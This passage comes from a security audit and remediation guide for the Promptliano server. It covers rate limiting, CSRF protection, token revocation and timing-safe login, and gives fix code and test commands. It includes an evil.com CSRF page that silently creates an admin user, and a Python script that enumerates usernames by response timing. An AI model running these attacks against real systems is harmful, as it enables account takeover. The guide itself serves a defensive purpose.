File: `/packages/server/src/app.ts`

```typescript
import { rateLimiters } from './middleware/rate-limiter'

// Apply global rate limit to all API endpoints
app.use('/api/*', rateLimiters.api) // ✅ Max 1000 requests per 15 minutes per IP

// ... rest of app configuration
```

**Step 5: Production - Redis-Backed Rate Limiting**

For production deployments, use Redis for distributed rate limiting:

File: `/packages/server/src/middleware/rate-limiter-redis.ts`

```typescript
import Redis from 'ioredis'
import { createMiddleware } from 'hono/factory'
import { ErrorFactory } from '@promptliano/shared'

const redis = new Redis({
  host: process.env.REDIS_HOST || 'localhost',
  port: parseInt(process.env.REDIS_PORT || '6379'),
  password: process.env.REDIS_PASSWORD,
})

export function createRedisRateLimiter(config: RateLimitConfig) {
  return createMiddleware(async (c, next) => {
    const key = `ratelimit:${config.keyGenerator?.(c) || getDefaultKey(c)}`
    const now = Date.now()

    // Use Redis sorted set for sliding window
    const pipeline = redis.pipeline()

    // Remove old entries outside the window
    pipeline.zremrangebyscore(key, 0, now - config.windowMs)

    // Count requests in current window
    pipeline.zcard(key)

    // Add current request
    pipeline.zadd(key, now, `${now}-${Math.random()}`)

    // Set expiry on key
    pipeline.expire(key, Math.ceil(config.windowMs / 1000))

    const results = await pipeline.exec()
    const count = results?.[1]?.[1] as number || 0

    if (count >= config.maxRequests) {
      const retryAfter = Math.ceil(config.windowMs / 1000)
      c.header('Retry-After', retryAfter.toString())

      throw ErrorFactory.tooManyRequests(
        `Rate limit exceeded. Try again in ${retryAfter} seconds.`
      )
    }

    c.header('X-RateLimit-Limit', config.maxRequests.toString())
    c.header('X-RateLimit-Remaining', Math.max(0, config.maxRequests - count - 1).toString())

    await next()
  })
}
```

#### Verification Testing

```bash
# Test 1: Verify login rate limiting
for i in {1..10}; do
  echo "Attempt $i:"
  curl -i -X POST http://localhost:3147/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"wrong"}'
  echo "\n---"
done
# Expected: First 5 succeed (with 401), 6th onwards return 429 Too Many Requests

# Test 2: Check rate limit headers
curl -i -X POST http://localhost:3147/api/auth/login \
  -d '{"username":"test","password":"test"}'
# Expected headers:
# X-RateLimit-Limit: 5
# X-RateLimit-Remaining: 4
# X-RateLimit-Reset: <timestamp>

# Test 3: Verify different IPs have separate limits
curl -X POST http://localhost:3147/api/auth/login \
  -H "X-Forwarded-For: 192.168.1.1" \
  -d '{"username":"test","password":"test"}'
# Should have separate rate limit from your main IP

# Test 4: Wait for window expiry
sleep 900 # Wait 15 minutes
curl -X POST http://localhost:3147/api/auth/login \
  -d '{"username":"test","password":"test"}'
# Expected: Rate limit reset, can make requests again
```

#### Deployment Checklist

- [ ] Configure rate limiting in environment variables
- [ ] Set up Redis for production (if using Redis backend)
- [ ] Monitor rate limit violations in logs
- [ ] Set up alerts for unusual rate limit patterns
- [ ] Document rate limits in API documentation
- [ ] Add rate limit info to error responses
- [ ] Test from different IP addresses
- [ ] Verify rate limits don't affect legitimate usage

---

### Issue #4: Missing CSRF Protection

**Severity:** 🟠 HIGH (7/10)
**CVSS Score:** 6.5 (Medium)
**Files Affected:**
- All POST/PUT/DELETE routes in `/packages/server/src/routes/`
- `/packages/client/src/lib/api-client.ts`

#### Vulnerability Description

State-changing operations have **no CSRF (Cross-Site Request Forgery) protection**. Malicious websites can trick authenticated users into performing unwanted actions.

**Attack Vectors:**
- Create/delete users without user consent
- Modify account settings
- Delete projects/tickets
- Any POST/PUT/DELETE operation

#### Attack Scenario

```html
<!-- Evil website (evil.com) tricks logged-in Promptliano user -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <!-- Invisible form submits to victim's Promptliano instance -->
  <form action="http://promptliano.local/api/admin/users" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="role" value="admin">
    <input type="hidden" name="password" value="secret123">
  </form>

  <!-- Or using JavaScript: -->
  <script>
    // If user is logged into Promptliano, their cookies will be sent
    fetch('http://promptliano.local/api/admin/users', {
      method: 'POST',
      credentials: 'include', // Sends auth cookies
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'hacker',
        role: 'admin',
        password: 'secret'
      })
    })
  </script>
</body>
</html>
```

When logged-in user visits evil.com, their session cookies are automatically sent, creating an admin user without their knowledge!

#### Complete Fix Implementation

**Step 1: Create CSRF Token Generation**

File: `/packages/server/src/middleware/csrf.ts`

```typescript
import { createMiddleware } from 'hono/factory'
import { setCookie, getCookie } from 'hono/cookie'
import crypto from 'crypto'
import { ErrorFactory } from '@promptliano/shared'
import type { Context } from 'hono'

interface CsrfConfig {
  cookieName?: string
  headerName?: string
  ignoredPaths?: string[]
  tokenLength?: number
}

// Store for CSRF tokens (use Redis in production)
const csrfTokens = new Map<string, { token: string; expiresAt: number }>()

/**
 * Generate a cryptographically secure CSRF token
 */
export function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex')
}

/**
 * Validate CSRF token
 */
function validateCsrfToken(token: string): boolean {
  const record = csrfTokens.get(token)

  if (!record) {
    return false
  }

  if (Date.now() > record.expiresAt) {
    csrfTokens.delete(token)
    return false
  }

  return true
}

/**
 * Store CSRF token
 */
function storeCsrfToken(token: string, expiresAt: number): void {
  csrfTokens.set(token, { token, expiresAt })
}

/**
 * Cleanup expired tokens
 */
setInterval(() => {
  const now = Date.now()
  for (const [key, record] of csrfTokens.entries()) {
    if (now > record.expiresAt) {
      csrfTokens.delete(key)
    }
  }
}, 5 * 60 * 1000) // Clean up every 5 minutes

/**
 * CSRF protection middleware
 */
export function createCsrfProtection(config: CsrfConfig = {}) {
  const {
    cookieName = 'csrf_token',
    headerName = 'x-csrf-token',
    ignoredPaths = [],
    tokenLength = 32
  } = config

  return createMiddleware(async (c, next) => {
    const path = c.req.path
    const method = c.req.method

    // Skip CSRF for safe methods
    if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {
      await next()
      return
    }

    // Skip CSRF for ignored paths
    if (ignoredPaths.some(p => path.startsWith(p))) {
      await next()
      return
    }

    // Get CSRF token from header
    const headerToken = c.req.header(headerName)

    // Get CSRF token from cookie
    const cookieToken = getCookie(c, cookieName)

    // Both tokens must exist and match
    if (!headerToken || !cookieToken || headerToken !== cookieToken) {
      throw ErrorFactory.forbidden(
        'CSRF token validation failed. Please refresh the page and try again.',
        'csrf'
      )
    }

    // Validate token hasn't expired
    if (!validateCsrfToken(headerToken)) {
      throw ErrorFactory.forbidden(
        'CSRF token expired. Please refresh the page and try again.',
        'csrf'
      )
    }

    await next()
  })
}

/**
 * Middleware to generate and set CSRF token
 */
export const csrfTokenGenerator = createMiddleware(async (c, next) => {
  // Check if token already exists
  let token = getCookie(c, 'csrf_token')

  if (!token || !validateCsrfToken(token)) {
    // Generate new token
    token = generateCsrfToken()
    const expiresAt = Date.now() + (24 * 60 * 60 * 1000) // 24 hours

    // Store token
    storeCsrfToken(token, expiresAt)

    // Set cookie
    setCookie(c, 'csrf_token', token, {
      httpOnly: false, // ⚠️ Must be accessible to JavaScript to send in headers
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'Strict',
      maxAge: 24 * 60 * 60, // 24 hours
      path: '/'
    })
  }

  // Make token available in context for rendering
  c.set('csrfToken', token)

  await next()
})

/**
 * Route handler to get CSRF token
 */
export async function getCsrfTokenHandler(c: Context) {
  const token = c.get('csrfToken') || getCookie(c, 'csrf_token')

  if (!token) {
    const newToken = generateCsrfToken()
    const expiresAt = Date.now() + (24 * 60 * 60 * 1000)
    storeCsrfToken(newToken, expiresAt)

    return c.json({ token: newToken })
  }

  return c.json({ token })
}
```

**Step 2: Apply CSRF Protection to Routes**

File: `/packages/server/src/app.ts`

```typescript
import { csrfTokenGenerator, createCsrfProtection } from './middleware/csrf'

// Generate CSRF tokens for all requests
app.use('*', csrfTokenGenerator)

// Apply CSRF protection to all state-changing operations
app.use(
  '/api/*',
  createCsrfProtection({
    ignoredPaths: [
      '/api/auth/status',    // Public endpoint
      '/api/health',         // Public endpoint
      '/api/csrf-token',     // CSRF token endpoint itself
    ]
  })
)
```

**Step 3: Add CSRF Token Endpoint**

File: `/packages/server/src/routes/auth-routes.ts`

```typescript
import { getCsrfTokenHandler } from '../middleware/csrf'
import { createRoute } from '@hono/zod-openapi'

// CSRF token endpoint
const csrfTokenRoute = createRoute({
  method: 'get',
  path: '/api/csrf-token',
  tags: ['Authentication'],
  responses: {
    200: {
      description: 'CSRF token',
      content: {
        'application/json': {
          schema: z.object({
            token: z.string()
          })
        }
      }
    }
  }
})

authRoutes.openapi(csrfTokenRoute, getCsrfTokenHandler)
```

**Step 4: Update Client - Send CSRF Token**

File: `/packages/client/src/lib/csrf.ts`

```typescript
/**
 * CSRF token management for client
 */

let csrfToken: string | null = null

/**
 * Get CSRF token from cookie
 */
function getCsrfTokenFromCookie(): string | null {
  const cookies = document.cookie.split(';')
  const csrfCookie = cookies.find(c => c.trim().startsWith('csrf_token='))

  if (!csrfCookie) return null

  return csrfCookie.split('=')[1]
}

/**
 * Fetch CSRF token from server
 */
async function fetchCsrfToken(): Promise<string> {
  try {
    const response = await fetch('/api/csrf-token', {
      credentials: 'include'
    })

    if (!response.ok) {
      throw new Error('Failed to fetch CSRF token')
    }

    const data = await response.json()
    return data.token
  } catch (error) {
    console.error('Error fetching CSRF token:', error)
    throw error
  }
}

/**
 * Get current CSRF token (from cookie or fetch from server)
 */
export async function getCsrfToken(): Promise<string> {
  // Try to get from cookie first
  const cookieToken = getCsrfTokenFromCookie()

  if (cookieToken) {
    csrfToken = cookieToken
    return cookieToken
  }

  // If not in cookie, fetch from server
  if (!csrfToken) {
    csrfToken = await fetchCsrfToken()
  }

  return csrfToken
}

/**
 * Clear cached CSRF token (e.g., after logout)
 */
export function clearCsrfToken(): void {
  csrfToken = null
}
```

**Step 5: Update Base API Client - Add CSRF Header**

File: `/packages/api-client/src/base-client.ts`

```typescript
import { getCsrfToken } from '@/lib/csrf' // Client-side only

protected async request<TResponse>(
  method: string,
  endpoint: string,
  options?: RequestOptions
): Promise<TResponse> {
  // ... existing code ...

  let headers = { ...this.headers, ...options?.headers }

  // Add CSRF token for state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method.toUpperCase())) {
    try {
      const csrfToken = await getCsrfToken()
      headers['X-CSRF-Token'] = csrfToken
    } catch (error) {
      console.error('Failed to get CSRF token:', error)
      // Continue without CSRF token - will fail on server
    }
  }

  const response = await this.customFetch(url.toString(), {
    method,
    headers,
    body,
    signal: controller.signal,
    credentials: 'include',
  })

  // ... rest of implementation
}
```

**Step 6: Initialize CSRF on App Load**

File: `/packages/client/src/main.tsx`

```typescript
import { getCsrfToken } from '@/lib/csrf'

// Fetch CSRF token on app initialization
getCsrfToken().catch(err => {
  console.error('Failed to initialize CSRF token:', err)
})

const root = ReactDOM.createRoot(rootElement)
root.render(
  <QueryClientProvider client={queryClient}>
    <AuthProvider serverUrl={serverUrl}>
      <PromptlianoClientProvider>
        <RouterProvider router={router} />
        <Toaster position='bottom-right' />
      </PromptlianoClientProvider>
    </AuthProvider>
  </QueryClientProvider>
)
```

**Step 7: Clear CSRF on Logout**

File: `/packages/client/src/contexts/auth-context.tsx`

```typescript
import { clearCsrfToken } from '@/lib/csrf'

const logout = useCallback(async () => {
  try {
    await authClient.logout({})
  } catch (error) {
    console.error('Logout error:', error)
  } finally {
    setUser(null)
    localStorage.removeItem(STORAGE_KEYS.USER)
    clearCsrfToken() // ✅ Clear CSRF token
    navigate({ to: '/login' })
  }
}, [navigate])
```

#### Alternative: SameSite Cookie Protection

If your application doesn't need to make cross-origin requests, `SameSite=Strict` cookies provide CSRF protection:

```typescript
// In cookie configuration (already implemented in Issue #2)
const COOKIE_OPTIONS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'Strict' as const, // ✅ Prevents cross-site cookie sending
  path: '/',
}
```

**When to use SameSite vs CSRF tokens:**
- **SameSite=Strict**: If app is same-origin only (recommended)
- **CSRF tokens**: If app needs cross-origin requests or supports older browsers

#### Verification Testing

```bash
# Test 1: Verify CSRF token generation
curl -i http://localhost:3147/api/csrf-token
# Expected: { "token": "..." } and Set-Cookie header with csrf_token

# Test 2: Verify CSRF protection blocks requests without token
curl -X POST http://localhost:3147/api/admin/users \
  -H "Content-Type: application/json" \
  -H "Cookie: access_token=..." \
  -d '{"username":"test","role":"user"}'
# Expected: 403 Forbidden - CSRF token validation failed

# Test 3: Verify CSRF protection allows requests with token
CSRF_TOKEN=$(curl -s http://localhost:3147/api/csrf-token | jq -r '.token')
curl -X POST http://localhost:3147/api/admin/users \
  -H "Content-Type: application/json" \
  -H "Cookie: access_token=...; csrf_token=$CSRF_TOKEN" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -d '{"username":"test","role":"user"}'
# Expected: 200 OK - Request successful

# Test 4: Verify token mismatch is rejected
curl -X POST http://localhost:3147/api/admin/users \
  -H "X-CSRF-Token: wrong-token" \
  -H "Cookie: csrf_token=correct-token" \
  -d '{"username":"test"}'
# Expected: 403 Forbidden
```

#### Deployment Checklist

- [ ] Enable CSRF protection in production
- [ ] Verify SameSite cookie support
- [ ] Test with different browsers
- [ ] Document CSRF requirements for API consumers
- [ ] Monitor CSRF failures in logs
- [ ] Set up alerts for unusual CSRF violations
- [ ] Verify token rotation on session changes

---

## 🟠 HIGH-PRIORITY ISSUES (P1 - Fix Week 1-2)

### Issue #5: No Token Revocation Blacklist

**Severity:** 🟠 HIGH (6/10)
**Files Affected:**
- `/packages/services/src/auth-service.ts` (token verification)
- `/packages/database/src/schema.ts` (add blacklist table)

#### Vulnerability Description

Once issued, access tokens remain valid until natural expiry (15 minutes). There's **no way to immediately revoke a token** if:
- Token is compromised
- User reports suspicious activity
- Admin needs to force logout a user
- Password is changed

**Current Behavior:**
```typescript
// Token validation has no revocation check
const decoded = jwt.verify(token, jwtSecret)
// ✅ Valid signature → Token accepted
// ❌ No check if token was revoked!
```

#### Attack Scenario

```
1. User's laptop is stolen at 2:00 PM
2. User reports to admin at 2:05 PM
3. Admin tries to logout all user sessions
4. PROBLEM: Stolen laptop still has valid access token until 2:15 PM
5. Attacker has 10 minutes of unrestricted access
```

#### Complete Fix Implementation

**Step 1: Add Token Blacklist Table**

File: `/packages/database/src/schema.ts`

```typescript
/**
 * Token blacklist for immediate revocation
 * Stores revoked tokens until their natural expiry
 */
export const tokenBlacklist = sqliteTable('token_blacklist', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  jti: text('jti').notNull().unique(), // JWT ID
  userId: integer('user_id').notNull().references(() => users.id, { onDelete: 'cascade' }),
  tokenType: text('token_type', { enum: ['access', 'refresh'] }).notNull(),
  reason: text('reason'), // Why was it revoked?
  expiresAt: integer('expires_at').notNull(),
  revokedAt: integer('revoked_at').notNull(),
  revokedBy: integer('revoked_by').references(() => users.id), // Admin who revoked
}, (table) => ({
  jtiIdx: index('token_blacklist_jti_idx').on(table.jti),
  userIdx: index('token_blacklist_user_idx').on(table.userId),
  expiresIdx: index('token_blacklist_expires_idx').on(table.expiresAt),
}))

export const insertTokenBlacklistSchema = createInsertSchema(tokenBlacklist)
export const selectTokenBlacklistSchema = createSelectSchema(tokenBlacklist)
export type TokenBlacklist = typeof tokenBlacklist.$inferSelect
export type InsertTokenBlacklist = typeof tokenBlacklist.$inferInsert
```

**Step 2: Generate and Apply Migration**

```bash
cd packages/database
bun run drizzle:generate
# Creates migration file: 0004_add_token_blacklist.sql
bun run drizzle:migrate
```

**Step 3: Add Repository Methods**

File: `/packages/database/src/repositories/auth-repository.ts`

```typescript
import { tokenBlacklist, type TokenBlacklist } from '../schema'

export const authRepository = {
  // ... existing methods

  /**
   * Blacklist a token
   */
  async blacklistToken(data: {
    jti: string
    userId: number
    tokenType: 'access' | 'refresh'
    expiresAt: number
    reason?: string
    revokedBy?: number
  }): Promise<TokenBlacklist> {
    const now = Date.now()
    const [entry] = await dbInstance
      .insert(tokenBlacklist)
      .values({
        ...data,
        revokedAt: now
      })
      .returning()

    if (!entry) {
      throw new Error('Failed to blacklist token')
    }

    return entry
  },

  /**
   * Check if token is blacklisted
   */
  async isTokenBlacklisted(jti: string): Promise<boolean> {
    const [entry] = await dbInstance
      .select()
      .from(tokenBlacklist)
      .where(eq(tokenBlacklist.jti, jti))
      .limit(1)

    return !!entry
  },

  /**
   * Revoke all tokens for a user
   */
  async revokeAllUserTokens(userId: number, reason: string, revokedBy?: number): Promise<number> {
    // This would require tracking all issued tokens
    // For now, we'll blacklist by deleting refresh tokens
    // and relying on short-lived access tokens

    const deletedCount = await this.deleteUserRefreshTokens(userId)

    // Log the revocation
    console.log(`Revoked all tokens for user ${userId}: ${reason}`)

    return deletedCount
  },

  /**
   * Cleanup expired blacklist entries
   */
  async cleanupExpiredBlacklist(): Promise<number> {
    const now = Date.now()
    const result = await dbInstance
      .delete(tokenBlacklist)
      .where(lte(tokenBlacklist.expiresAt, now))

    return (result as any).changes || 0
  },

  /**
   * Get blacklist stats for monitoring
   */
  async getBlacklistStats(): Promise<{
    total: number
    byType: Record<string, number>
    expiringIn24h: number
  }> {
    const [totalResult] = await dbInstance
      .select({ count: count() })
      .from(tokenBlacklist)

    const byTypeResults = await dbInstance
      .select({
        tokenType: tokenBlacklist.tokenType,
        count: count()
      })
      .from(tokenBlacklist)
      .groupBy(tokenBlacklist.tokenType)

    const [expiringResult] = await dbInstance
      .select({ count: count() })
      .from(tokenBlacklist)
      .where(lte(tokenBlacklist.expiresAt, Date.now() + (24 * 60 * 60 * 1000)))

    return {
      total: totalResult?.count || 0,
      byType: byTypeResults.reduce((acc, r) => ({
        ...acc,
        [r.tokenType]: r.count
      }), {}),
      expiringIn24h: expiringResult?.count || 0
    }
  }
}
```

**Step 4: Update Token Generation to Include JTI**

File: `/packages/services/src/auth-service.ts`

```typescript
import crypto from 'crypto'

interface JWTPayload {
  userId: number
  username: string
  role: 'admin' | 'user'
  type: 'access' | 'refresh'
  jti: string // ✅ Add JWT ID
  iat: number
  exp: number
}

/**
 * Generate access token with JTI
 */
function generateAccessToken(user: User): { token: string; jti: string; expiresAt: number } {
  const jti = crypto.randomBytes(16).toString('hex')
  const expiresIn = 15 * 60 * 1000 // 15 minutes
  const expiresAt = Date.now() + expiresIn

  const token = jwt.sign(
    {
      userId: user.id,
      username: user.username,
      role: user.role,
      type: 'access',
      jti // ✅ Include JTI in token
    },
    jwtSecret,
    {
      expiresIn: '15m',
      algorithm: 'HS256'
    }
  )

  return { token, jti, expiresAt }
}

/**
 * Verify access token and check blacklist
 */
function verifyAccessToken(token: string): JWTPayload | null {
  try {
    const decoded = jwt.verify(token, jwtSecret, {
      algorithms: ['HS256']
    }) as JWTPayload

    // ✅ Check if token is blacklisted
    if (authRepository.isTokenBlacklisted(decoded.jti)) {
      logger.warn('Attempted use of blacklisted token', {
        jti: decoded.jti,
        userId: decoded.userId
      })
      return null
    }

    return decoded
  } catch (error) {
    logger.error('Token verification failed', { error })
    return null
  }
}
```

**Step 5: Update Service Methods to Store JTI**

File: `/packages/services/src/auth-service.ts`

```typescript
async function authenticateUser(username: string, password?: string): Promise<AuthTokens> {
  // ... existing validation ...

  // Generate tokens with JTI
  const { token: accessToken, jti, expiresAt } = generateAccessToken(user)
  const refreshToken = generateRefreshToken()

  // Store refresh token with JTI reference
  await repository.createRefreshToken(
    user.id,
    refreshToken,
    Date.now() + (7 * 24 * 60 * 60 * 1000),
    jti // ✅ Store associated access token JTI
  )

  return {
    user,
    accessToken,
    refreshToken
  }
}

/**
 * Revoke a specific access token
 */
async function revokeAccessToken(
  jti: string,
  userId: number,
  reason: string,
  revokedBy?: number
): Promise<void> {
  // Decode JTI to get expiry
  // (In real implementation, store expiry separately or decode from token)
  const expiresAt = Date.now() + (15 * 60 * 1000) // Access tokens expire in 15 min

  await repository.blacklistToken({
    jti,
    userId,
    tokenType: 'access',
    expiresAt,
    reason,
    revokedBy
  })

  logger.info('Access token revoked', { jti, userId, reason })
}

/**
 * Logout and blacklist all user sessions
 */
async function logoutAllSessions(
  userId: number,
  reason: string = 'User logout',
  revokedBy?: number
): Promise<void> {
  // Get all user refresh tokens
  const refreshTokens = await repository.getUserRefreshTokens(userId)

  // Blacklist associated access tokens (if stored)
  for (const token of refreshTokens) {
    if (token.accessTokenJti) {
      await revokeAccessToken(token.accessTokenJti, userId, reason, revokedBy)
    }
  }

  // Delete all refresh tokens
  await repository.deleteUserRefreshTokens(userId)

  logger.info('All sessions logged out', { userId, reason })
}
```

**Step 6: Add Admin Endpoint to Revoke Tokens**

File: `/packages/server/src/routes/admin-routes.ts`

```typescript
// Revoke all user sessions endpoint
const revokeUserSessionsRoute = createRoute({
  method: 'post',
  path: '/api/admin/users/:id/revoke-sessions',
  tags: ['Admin', 'Users'],
  request: {
    params: z.object({
      id: z.coerce.number()
    }),
    body: {
      content: {
        'application/json': {
          schema: z.object({
            reason: z.string().optional()
          })
        }
      }
    }
  },
  responses: {
    200: {
      description: 'Sessions revoked successfully',
      content: {
        'application/json': {
          schema: z.object({
            success: z.boolean(),
            message: z.string()
          })
        }
      }
    }
  }
})

adminRoutes.openapi(revokeUserSessionsRoute, async (c) => {
  const { id } = c.req.valid('param')
  const { reason } = c.req.valid('json')
  const adminUser = c.get('user')

  try {
    await authService.logoutAllSessions(
      id,
      reason || 'Revoked by admin',
      adminUser.id
    )

    return c.json(successResponse({
      success: true,
      message: 'All sessions revoked successfully'
    }), 200)
  } catch (error) {
    throw ErrorFactory.internal('Failed to revoke sessions')
  }
})
```

**Step 7: Add Cleanup Job**

File: `/packages/server/src/jobs/cleanup-blacklist.ts`

```typescript
import { authRepository } from '@promptliano/database'

/**
 * Cleanup expired token blacklist entries
 * Run periodically to prevent unbounded growth
 */
export async function cleanupExpiredBlacklist() {
  try {
    const deleted = await authRepository.cleanupExpiredBlacklist()

    if (deleted > 0) {
      console.log(`Cleaned up ${deleted} expired blacklist entries`)
    }

    // Get stats for monitoring
    const stats = await authRepository.getBlacklistStats()
    console.log('Blacklist stats:', stats)
  } catch (error) {
    console.error('Error cleaning up blacklist:', error)
  }
}

// Run cleanup every hour
setInterval(cleanupExpiredBlacklist, 60 * 60 * 1000)

// Run immediately on startup
cleanupExpiredBlacklist()
```

#### Verification Testing

```typescript
// Test revocation flow
describe('Token Revocation', () => {
  test('should blacklist token on logout', async () => {
    // Login
    const { accessToken } = await authService.authenticateUser('test', 'password')

    // Decode to get JTI
    const decoded = jwt.decode(accessToken) as JWTPayload

    // Revoke token
    await authService.revokeAccessToken(decoded.jti, decoded.userId, 'Test logout')

    // Verify blacklisted
    const isBlacklisted = await authRepository.isTokenBlacklisted(decoded.jti)
    expect(isBlacklisted).toBe(true)

    // Verify token no longer works
    const verified = authService.verifyAccessToken(accessToken)
    expect(verified).toBeNull()
  })

  test('should revoke all user sessions', async () => {
    // Create multiple sessions
    const session1 = await authService.authenticateUser('test', 'password')
    const session2 = await authService.authenticateUser('test', 'password')

    // Revoke all
    await authService.logoutAllSessions(testUser.id, 'Security incident')

    // Verify both tokens revoked
    expect(authService.verifyAccessToken(session1.accessToken)).toBeNull()
    expect(authService.verifyAccessToken(session2.accessToken)).toBeNull()
  })
})
```

#### Deployment Checklist

- [ ] Run database migration to add `token_blacklist` table
- [ ] Enable cleanup job in production
- [ ] Monitor blacklist table size
- [ ] Set up alerts for unusual revocation patterns
- [ ] Test revocation endpoints
- [ ] Document revocation procedures for ops team

---

### Issue #6: Timing Attack Vulnerability in Password Verification

**Severity:** 🟠 MEDIUM-HIGH (6/10)
**Files Affected:**
- `/packages/services/src/auth-service.ts:212-239`

#### Vulnerability Description

Authentication response times reveal whether a username exists, enabling **username enumeration** and **timing attacks**.

**Timing Differences:**
```typescript
// Username doesn't exist → immediate error (~5ms)
if (!user) {
  throw ErrorFactory.notFound('User', username)
}

// Username exists → bcrypt verification (~100ms)
const isValid = await verifyPassword(password, user.passwordHash)

// Attacker can measure timing to enumerate valid usernames
```

#### Attack Scenario

```python
import time
import requests

def username_exists(username):
    start = time.time()
    requests.post('http://target/api/auth/login', json={
        'username': username,
        'password': 'x'
    })
    duration = time.time() - start

    # bcrypt verification takes ~100ms
    # Database lookup + immediate error takes ~5ms
    return duration > 0.05

# Enumerate valid usernames
for username in common_usernames:
    if username_exists(username):
        print(f"✅ Found valid username: {username}")
        # Now can focus brute force on this username

# Example output:
# ✅ Found valid username: admin
# ✅ Found valid username: root
# ✅ Found valid username: john.doe
```

#### Complete Fix Implementation

**Step 1: Constant-Time Authentication**

File: `/packages/services/src/auth-service.ts`

```typescript
/**
 * Pre-computed dummy hash for constant-time authentication
 * Generated once with: await bcrypt.hash('dummy-password-for-timing', 10)
 */
const DUMMY_PASSWORD_HASH = '$2b$10$ZvXQj3gqE1VqK8K8K8K8KeVpF9Zqvp9Zqvp9Zqvp9Zqvp9Zqvp9Zq'

/**
 * Constant-time user authentication
 * ALWAYS performs bcrypt verification regardless of whether user exists
 */
async function authenticateUser(username: string, password?: string): Promise<AuthTokens> {
  const startTime = Date.now()

  // Fetch user from database
  const user = await repository.getUserByUsername(username)

  // Determine which hash to verify against
  // If user doesn't exist, use dummy hash to maintain constant timing
  const hashToVerify = user?.passwordHash || DUMMY_PASSWORD_HASH
  const passwordToCheck = password || ''

  // ✅ ALWAYS perform bcrypt verification (constant time)
  // This takes ~100ms regardless of whether user exists
  const isPasswordValid = await verifyPassword(passwordToCheck, hashToVerify)

  // Calculate how long bcrypt took
  const bcryptDuration = Date.now() - startTime

  // Add artificial delay to mask any remaining timing variations
  // Target total time: 150ms ± 10ms random jitter
  const TARGET_AUTH_TIME = 150
  const remainingTime = TARGET_AUTH_TIME - bcryptDuration
  const jitter = Math.random() * 20 - 10 // ±10ms random
  const delayMs = Math.max(0, remainingTime + jitter)

  // ✅ Wait to normalize timing
  if (delayMs > 0) {
    await new Promise(resolve => setTimeout(resolve, delayMs))
  }

  // NOW check conditions (after timing-sensitive operations complete)
  if (!user) {
    // Generic error - don't reveal user doesn't exist
    throw ErrorFactory.unauthorized('Invalid credentials')
  }

  if (!user.isActive) {
    // Generic error - don't reveal user is inactive
    throw ErrorFactory.unauthorized('Invalid credentials')
  }

  if (user.passwordHash && !password) {
    // Password required but not provided
    throw ErrorFactory.unauthorized('Invalid credentials')
  }

  if (user.passwordHash && !isPasswordValid) {
    // Invalid password
    throw ErrorFactory.unauthorized('Invalid credentials')
  }

  // Success! Generate tokens
  const { token: accessToken, jti, expiresAt } = generateAccessToken(user)
  const refreshToken = generateRefreshToken()

  await repository.createRefreshToken(
    user.id,
    refreshToken,
    Date.now() + (7 * 24 * 60 * 60 * 1000)
  )

  logger.info('User authenticated', { userId: user.id })

  return {
    user,
    accessToken,
    refreshToken
  }
}
```

**Step 2: Generic Error Messages**

File: `/packages/services/src/auth-service.ts`

```typescript
/**
 * All authentication errors use the same generic message
 * Never reveal:
 * - Whether username exists
 * - Whether user is inactive
 * - Whether password is wrong
 * - Whether password is required
 */
const AUTH_ERROR_MESSAGE = 'Invalid credentials' as const

// Update all error cases
throw ErrorFactory.unauthorized(AUTH_ERROR_MESSAGE)
```

**Step 3: Add Timing Analysis Protection**

File: `/packages/server/src/middleware/timing-safe.ts`

```typescript
import { createMiddleware } from 'hono/factory'

/**
 * Middleware to add random jitter to response times
 * Helps mask timing differences that might leak information
 */
export const timingSafeMiddleware = createMiddleware(async (c, next) => {
  const startTime = Date.now()

  await next()

  // For auth endpoints, add random jitter
  const path = c.req.path
  if (path.includes('/auth/')) {
    const duration = Date.now() - startTime

    // If response was very fast (<50ms), add delay
    if (duration < 50) {
      const jitter = Math.random() * 100 + 50 // 50-150ms
      await new Promise(resolve => setTimeout(resolve, jitter))
    }
  }
})
```

**Step 4: Rate Limiting by Username**

Since we can't prevent timing analysis entirely, add aggressive rate limiting:

File: `/packages/server/src/middleware/rate-limiter.ts`

```typescript
// Username-specific rate limiting
export const loginRateLimiter = createRateLimiter({
  windowMs: 15 * 60 * 1000, // 15 minutes
  maxRequests: 5,
  keyGenerator: async (c) => {
    // Rate limit by username + IP
    // This prevents brute force even if username enumeration succeeds
    const body = await c.req.json()
    const username = body.username || 'unknown'
    const ip = c.req.header('x-forwarded-for')?.split(',')[0] || 'unknown'

    return `login:${username}:${ip}`
  }
})
```

**Step 5: Monitoring and Alerting**

File: `/packages/server/src/monitoring/auth-monitoring.ts`

```typescript
/**
 * Monitor for potential timing attacks
 */
export function monitorTimingAttack(username: string, ip: string, duration: number) {
  // If many requests to same username from same IP
  // This might indicate timing analysis attack

  const key = `timing-monitor:${username}:${ip}`
  const count = requestCountMap.get(key) || 0

  requestCountMap.set(key, count + 1)

  if (count > 20) { // 20 requests to same username
    logger.security('Potential timing attack detected', {
      username,
      ip,
      requestCount: count,
      avgDuration: duration
    })

    // Could trigger additional security measures:
    // - Temporarily block IP
    // - Require CAPTCHA
    // - Alert security team
  }
}
```

#### Verification Testing

```python
# Test timing attack mitigation
import time
import statistics
import requests

def measure_auth_timing(username, password):
    """Measure authentication response time"""
    start = time.time()
    requests.post('http://localhost:3147/api/auth/login', json={
        'username': username,
        'password': password
    })
    return time.time() - start

# Test with valid and invalid usernames
valid_times = [measure_auth_timing('admin', 'wrong') for _ in range(50)]
invalid_times = [measure_auth_timing('nonexistent', 'wrong') for _ in range(50)]

print(f"Valid username avg: {statistics.mean(valid_times):.3f}s ± {statistics.stdev(valid_times):.3f}s")
print(f"Invalid username avg: {statistics.mean(invalid_times):.3f}s ± {statistics.stdev(invalid_times):.3f}s")

# Expected: Times should be statistically indistinguishable
# Both should be ~150ms with similar variance
```

#### Deployment Checklist

- [ ] Update authentication to constant-time implementation
- [ ] Verify all auth errors use generic messages
- [ ] Enable timing-safe middleware
- [ ] Test with timing analysis tools
